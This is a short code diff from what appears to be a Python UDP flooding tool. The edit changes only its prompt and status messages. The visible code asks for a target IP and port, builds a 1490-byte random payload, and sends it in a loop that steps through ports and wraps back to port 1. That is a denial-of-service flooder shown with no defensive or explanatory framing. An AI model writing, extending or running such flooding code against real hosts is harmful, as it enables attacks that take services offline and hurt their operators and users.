@@ -104,7 +104,7 @@ def req_send(ip,port,byte):
     sock.sendto(byte, (ip,port))
     send += 1
     port += 1
-    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
+    print (f"{green}Sent{red} {send}{green} packet{blue} {ip}{green} port: {yellow}{port}{default}")
     if port == 65534:
       port = 1
 
@@ -112,8 +112,8 @@ if __name__ == "__main__":
 	check_net_con()
 ############ we will take input#####
 try:
-    ip = input(f"{green} Enter Target IP or Hostname : => {default}")
-    port = int(input(f"{green} Enter Port Number : => {default}"))
+    ip = input(f"{green} Enter Target IP : => {default}")
+    port = int(input(f"{green} Enter Port : => {default}"))
     
     if not (ip == "" or port == ""):
       byte = _urandom(1490)
